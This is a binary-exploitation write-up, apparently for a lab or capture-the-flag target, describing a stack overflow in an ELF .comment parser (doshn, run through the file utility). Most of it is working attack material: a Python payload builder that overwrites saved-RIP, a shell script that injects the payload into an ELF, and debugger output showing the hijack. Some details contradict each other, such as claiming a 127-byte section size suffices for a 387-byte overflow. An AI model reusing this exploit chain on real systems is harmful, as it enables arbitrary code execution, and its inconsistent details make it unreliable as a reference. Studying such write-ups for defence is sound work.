+++
date = '2025-06-30'
draft = false
title = 'Buffer overflow writeup'
tags = ["vulnerability research", "buffer overflow", "linux", "binary exploitation"]
+++

## 1. Overview of the Vulnerability

When **readelf** processes the `.comment` section of an ELF, it enters a loop that copies bytes from that section into a fixed‐size, 128‐byte stack buffer named `comment[]`. Internally, the code looks roughly like this:

```c
#define MAX_COMMENT 128
char comment[MAX_COMMENT];
int  version_start = 0, idx = 0;
char c;

/* xsh_offset points to the file‐offset of .comment’s data */
while (pread(fd, &c, 1, xsh_offset + idx) == 1) {
    if (c == '(') {
        version_start = idx + 1;
    }
    else if (c == ')') {
        break;
    }
    else if (version_start != 0) {
        /* UNBOUNDED WRITE: */
        comment[idx - version_start] = c;
    }
    idx++;
}
comment[idx - version_start] = '\0';
file_printf(ms, ", os/compiler version => [%s]", comment);
```

- **`comment` is 128 bytes long**, stored at `RBP - 0xF0` through `RBP - 0x70` on x86-64.  
- Whenever the code sees a `'('`, it sets `version_start = idx + 1`. From that point on, each subsequent byte (up until a `')'`) is written to `comment[idx - version_start]`.  
- **There is no bounds check** on `idx - version_start`, so once that expression exceeds 127, writes begin overflowing into adjacent stack memory (locals, saved-RBP, then saved-RIP).  
- As soon as a `')'` is read, the loop breaks and writes a NUL at `comment[idx - version_start]`.  

By carefully choosing where two `'('` characters appear in the input, we can control _exactly_ when the code starts writing to `comment[0]` and then intentionally overflow beyond offset 127 to overwrite saved-RIP. When `doshn` eventually returns, it will pop our crafted return address from the stack.

---

## 2. Exploitation Strategy (the “Two-`(`” Trick)

1. **First `(` sets up a “start index.”**  
   - The very first `(` in the input sets `version_start = idx + 1`. We can decide at which `idx` that happens by prepending junk bytes.  

2. **Refill `comment[0..127]` exactly once**.  
   - After the first `(`, we send 128 filler bytes, which fill `comment[0..127]` without overflow.  
   - This ensures the next writes go out of bounds in a fully predictable way.

3. **Second `(` resets `version_start` again.**  
   - When the second `(` arrives at a known `idx`, it performs `version_start = idx + 1`.  
   - From that moment on, each new byte lands at `comment[idx - version_start]`.  
   - If we send 248 bytes after that point, then the _first_ of those 248 lands in `comment[248]`, which is the saved-RIP slot.  

4. **Overwrite saved-RIP with a chosen 8-byte address.**  
   - We craft eight little-endian bytes immediately after those 248 filler bytes. This overwrites the saved-RIP.  

5. **Send `')'` to break the loop** (no write on that iteration).  
   - This prevents further writes from corrupting other locals or messing up `version_start`/`idx`.  
   - Then the function does a `ret`, popping our overwritten value into `%rip`.

By carefully counting bytes, we can place any 64-bit address into saved-RIP and force execution to jump there when `doshn` returns.

---

## 3. Payload Construction (`payload.bin`)

Below is the Python snippet that creates a 387-byte payload. We annotate every region by its “loop index” (`idx`) and show where saved-RIP gets overwritten:

```python
# 8‐byte return address we want (e.g. address of print_flag)
# Little-endian: 0x004241f2 -> b"\xf2\x41\x42\x00\x00\x00\x00\x00"
MANUAL_RIP = b"\xf2\x41\x42\x00\x00\x00\x00\x00"

blob = b"("
# idx = 0 -> version_start := 1
# (No write into comment[] on this byte.)

blob += b"A" * 128
# idx = 1..128 -> comment[idx - 1] = 'A'
# After idx=128, comment[0..127] is fully “A”. Now idx -> 129.

blob += b"("
# idx = 129 -> version_start := 130
# (No write on this byte.)
# Now idx -> 130.

# At idx=130, “idx - version_start = 0.” Next writes land in comment[0..].
# To reach saved-RIP (offset 248), send 248 filler bytes “B”:
blob += b"B" * 248
#   idx=130..257 (128 B’s) refill comment[0..127].
#   idx=258..377 (120 B’s) overflow into comment[128..247] (locals & saved-RBP).

# Now idx = 378. (378 - 130 = 248) -> offset 248 = saved-RIP LSB.
# Overwrite saved-RIP (8 bytes):
blob += MANUAL_RIP
# idx = 378..385 -> comment[248..255] = "\xf2\x41\x42\x00\x00\x00\x00\x00"

# Finally, idx=386 -> send “)” to break the loop (no write):
blob += b")"
# Loop ends; doshn will call ret, popping 0x004241f2 into RIP.

with open("payload.bin", "wb") as f:
    f.write(blob)

print(f"payload.bin is {len(blob)} bytes (should be 387).")
```

- **First `"("` at idx=0** sets `version_start = 1`.  
- **128× `"A"` at idx=1..128** fills `comment[0..127]`.  
- **Second `"("` at idx=129** sets `version_start = 130`.  
- **248× `"B"` at idx=130..377**  
  - idx=130..257 (128 bytes) refill `comment[0..127]`.  
  - idx=258..377 (120 bytes) overflow into locals and saved-RBP up through offset 247.  
- **8 bytes of `MANUAL_RIP` at idx=378..385** overwrite saved-RIP (offset 248..255).  
- **Final `")"` at idx=386** breaks the loop, preventing any further writes.

After that, `doshn` does a `ret`, and the CPU pops `0x004241f2` into `%rip`, redirecting execution.

---

## 4. Patching a Minimal ELF (`patch.sh`)

We start from a trivial C program:

```c
int main(void) {
    return 0;
}
```

Compile it (e.g., `gcc -no-pie -o exploit.elf exploit.c`) to produce a minimal ELF named `exploit.elf`. That ELF automatically has a `.comment` section (filled with compiler version strings). We will remove that section and replace it with our `payload.bin`.

```bash
#!/usr/bin/env bash
#
# patch.sh
#
# 1) Removes any existing .comment section from exploit.elf.
# 2) Injects payload.bin as a new .comment section (with ALLOC flag).
# 3) Patches .comment’s sh_size field to be 0x7f (127).
#
# Usage:
#   1) Generate payload.bin as shown above.
#   2) Update FILE, PAYLOAD, E_SHOFF_HEX, COMMENT_SEC_IDX below.
#   3) chmod +x patch_and_inject.sh && ./patch_and_inject.sh
#   4) Verify with `readelf -S exploit.elf | grep .comment`
#

##### -- USER‐EDITABLE SECTION ----------------------------------------------------

FILE="exploit.elf"         # The ELF to patch
PAYLOAD="payload.bin"      # The malicious payload

# From `readelf -h exploit.elf`:
#   Start of section headers: 0x<hex>
E_SHOFF_HEX="0x4768"

# From `readelf -S exploit.elf | grep "\.comment"` (before patch):
#   [ 25] .comment …
COMMENT_SEC_IDX=25

##### -- END OF USER‐EDITABLE SECTION --------------------------------------------

# 1) Remove any existing .comment
objcopy --remove-section .comment "$FILE" 2>/dev/null || true

# 2) Add payload.bin as .comment (with ALLOC so readelf will load it)
objcopy   --add-section .comment="$PAYLOAD"   --set-section-flags .comment=contents,alloc   "$FILE" || { echo "Injection failed"; exit 1; }

echo "Before patch:"
readelf -S "$FILE" | grep '\.comment'

# 3) Compute where to patch sh_size for .comment to 0x7f
E_SHOFF=$((E_SHOFF_HEX))
BYTES_PER_SHDR=64
SH_SIZE_OFFSET=32  # within each Elf64_Shdr

SH_SIZE_FIELD_OFFSET=$(( E_SHOFF + COMMENT_SEC_IDX*BYTES_PER_SHDR + SH_SIZE_OFFSET ))

printf '\x7f\x00\x00\x00\x00\x00\x00\x00' |   dd of="$FILE" bs=1 seek="$SH_SIZE_FIELD_OFFSET" count=8 conv=notrunc status=none

echo "After patch:"
readelf -S "$FILE" | grep '\.comment'
```

- **Step 1**: `--remove-section .comment` deletes the existing `.comment`.  
- **Step 2**: `--add-section .comment=payload.bin` creates a new `.comment` containing our 387 bytes. We set `contents,alloc` so that section is loaded.  
- **Step 3**: We patch the `sh_size` field (8 bytes at offset `E_SHOFF + 64*COMMENT_SEC_IDX + 32`) to `0x7f` so that `readelf` will only read the first 127 bytes of `.comment` (enough to trigger the overflow).  

After running this script, `exploit.elf` has a `.comment` of size 0x7f whose contents begin with our 387-byte payload. When `doshn` reads up to 127 bytes of that section, it will see both `(` characters, overflow into saved-RIP, and then return into our chosen address.

---

## 5. Verifying the Exploit under pwndbg

1. **Launch pwndbg on the patched binary**:  
   ```bash
   pwndbg --args ./file -m magic.mgc exploit.elf
   ```
   Inside GDB:  
   ```gdb
   pwndbg> b readelf.c:1510    # break right before “comment[idx-version_start] = '\0'”
   pwndbg> run
   ```
   You should see:
   ```
   Breakpoint 1, doshn (…) at readelf.c:1510
   ```
---
2. **Check local variables**:  
   ```gdb
   pwndbg> info locals
   c             = 41          # ')'
   idx           = 386
   version_start = 130
   comment       = "B"*128
   … 
   ```
   - `version_start = 130` confirms the **second** `(` arrived at `idx = 129`.  
   - `idx = 386` means we just processed the final `')'`.

3. **Find `comment[0]` in memory** (using `rdx`, which was set by `lea rdx, [rbp-0xf0]` earlier):  
   ```gdb
   pwndbg> print/x $rdx
   $1 = 0x7fffffffd490    # example address of comment[0]
   ```

4. **Compute saved-RIP = `comment[0] + 0xf8`** (248 bytes past):  
   ```gdb
   pwndbg> print/x $rdx + 0xf8
   $2 = 0x7fffffffd588    # address of saved-RIP
   ```

5. **Dump the 8 bytes at that address**:  
   ```gdb
   pwndbg> x/gx $rdx + 0xf8
   0x7fffffffd588: 0x00000000004241f2
   ```
   Those eight bytes match our `MANUAL_RIP = b"\xf2\x41\x42\x00\x00\x00\x00\x00"`, so saved-RIP was overwritten correctly with `0x004241f2`.

6. **Execute the `ret` so it actually jumps**:  
   ```gdb
   pwndbg> finish
   ```
   GDB prints:
   ```
   Run till exit from #0  doshn (…) at readelf.c:1510
   0x00000000004241f2 in print_flag ()
   ```
   
   That shows control has transferred to `print_flag` at `0x4241f2`. You have successfully hijacked RIP.

---

## 6. Summary

- **Vulnerability**: Unbounded stack write in `doshn` when parsing `.comment`. Two carefully placed `(` characters cause writes to overflow from a 128-byte buffer into saved-RIP.  
- **Payload**: 387 bytes that:
  1. Perform two “(`)” markers at strategic indices to reset the write base,
  2. Overflow exactly 248 bytes past the second `(` into saved-RIP,
  3. Place an 8-byte target address (little-endian) at saved-RIP,
  4. Break with `')'` so no further writes occur.  
- **ELF Injection**: We carve out a minimal ELF (`exploit.elf`), remove its original `.comment`, insert `payload.bin`, and patch `.comment.sh_size` to 0x7f.  
- **Verification**: Under pwndbg, at the overwrite‐site breakpoint:
  - Check `version_start = 130` (second `(` at idx=129).  
  - Read saved-RIP from `comment[0] + 248 = $rdx + 0xf8`.  
  - Confirm the 8 bytes equal our chosen return address.  
  - Use `finish` (or `stepi`) to execute the `ret` and land in `print_flag`.

This end-to-end chain demonstrates a reliable stack-buffer overflow in readelf’s `.comment` parser that grants arbitrary code execution by overwriting the return address.
